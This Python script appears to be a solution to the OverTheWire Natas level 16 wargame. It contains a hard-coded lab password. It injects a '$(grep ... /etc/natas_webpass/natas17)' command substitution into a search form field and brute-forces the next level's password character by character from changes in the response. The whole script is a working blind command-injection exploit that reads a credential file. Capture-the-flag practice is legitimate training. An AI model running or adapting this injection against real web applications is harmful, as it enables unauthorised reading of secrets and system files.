from urllib import response

#3.9 pythonnal megy!!
import urllib
import requests
import re
import string

characters = string.ascii_uppercase + string.ascii_lowercase + string.digits
passwd = list()

username = 'natas16'
password = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'
            

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
#reponse = session.get(url , auth=(username, password))
passwd = ''
oldlenght = 0
passwordLeaked = ''
def ownSolution():
    while True:
        for char in characters:
            print('Trying password :', ''.join(passwd)+char)
            reponse = session.post(url , data={"needle":"anythings$(grep "+''.join(passwd)+char+" /etc/natas_webpass/natas17)"}, auth=(username, password))
            content = reponse.text
            oldlenght = len(passwd)
            if not re.findall('anythings',content):
                passwd += char
                break
        if len(passwd) == oldlenght:
            for char in passwd[0:oldlenght]:
                passwordLeaked += char
            print('The password is :', passwordLeaked)
            break
    

while len(passwd) < 32:
    for char in characters:
        print('Trying password :', ''.join(passwd)+char)
        reponse = session.post(url , data={"needle":"anythings$(grep ^"+''.join(passwd)+char+" /etc/natas_webpass/natas17)"}, auth=(username, password))
        content = reponse.text
        
        if not re.findall('anythings',content):
            passwd += char
            break
        
    #for char in passwd[0:oldlenght]:
        #passwordLeaked += char
print('The password is :', passwd)
    


#$(grep b /etc/natas_webpass/natas17)